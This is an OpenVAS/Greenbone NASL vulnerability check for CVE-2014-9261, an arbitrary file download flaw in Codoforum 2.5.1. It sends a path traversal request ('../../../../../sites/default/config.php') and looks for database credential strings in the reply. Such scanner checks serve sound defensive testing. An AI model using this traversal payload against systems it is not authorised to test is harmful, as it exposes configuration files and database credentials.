# SPDX-FileCopyrightText: 2015 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:codoforum:codoforum";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805494");
  script_version("2023-07-25T05:05:58+0000");
  script_cve_id("CVE-2014-9261");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"2023-07-25 05:05:58 +0000 (Tue, 25 Jul 2023)");
  script_tag(name:"creation_date", value:"2015-03-17 12:08:01 +0530 (Tue, 17 Mar 2015)");
  script_name("Codoforum Arbitrary File Download Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_codoforum_detect.nasl");
  script_mandatory_keys("Codoforum/Installed");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"Codoforum is prone to arbitrary file download vulnerability.");
  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET and
  check whether it is able to download an arbitrary file.");
  script_tag(name:"insight", value:"Flaw is due to improper input sanitization
  of index.php script.");
  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to gain access to arbitrary files and to compromise the application.");
  script_tag(name:"affected", value:"Codoforum version 2.5.1.");
  script_tag(name:"solution", value:"Upgrade to Codoforum version 2.6  or
  later.");

  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/130739/");
  script_xref(name:"URL", value:"http://security.szurek.pl/codoforum-251-arbitrary-file-download.html");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  script_xref(name:"URL", value:"https://codoforum.com/");
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

if( dir == "/" ) dir = "";

url = dir + "/index.php?u=serve/attachment&path=../../../../../sites/default/config.php";

if( http_vuln_check( port:port, url:url, check_header:TRUE,
                     pattern:"(database|username|password)", extra_check:"get_codo_db_conf" ) ) {
  report = http_report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
